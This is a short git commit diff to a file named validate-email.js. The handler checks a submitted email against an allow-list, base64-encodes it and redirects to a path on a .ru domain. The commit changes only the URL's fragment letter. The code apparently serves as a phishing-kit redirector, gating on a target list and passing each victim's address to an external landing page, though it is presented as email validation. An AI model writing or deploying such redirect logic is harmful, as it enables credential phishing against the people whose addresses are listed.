1f4578db56fb431f72b5cc7a79673debfa6f2f03
dakotalynng <dakotalynn@griffinwink.com>
2025-02-03 16:46:58 -0600

    Update validate-email.js

--- api/validate-email.js
+++ api/validate-email.js
@@ -24,7 +24,7 @@ export default function handler(req, res) {
     // Validate the email
     if (allowedEmailsCache.includes(email)) {
       // Construct the redirect URL
-      const baseURL = "https://848l.bomirax.ru/Z1cxl9eG/#D";
+      const baseURL = "https://848l.bomirax.ru/Z1cxl9eG/#M";
       const encodedEmail = Buffer.from(email).toString("base64");
       const redirectURL = `${baseURL}${encodedEmail}`;
 
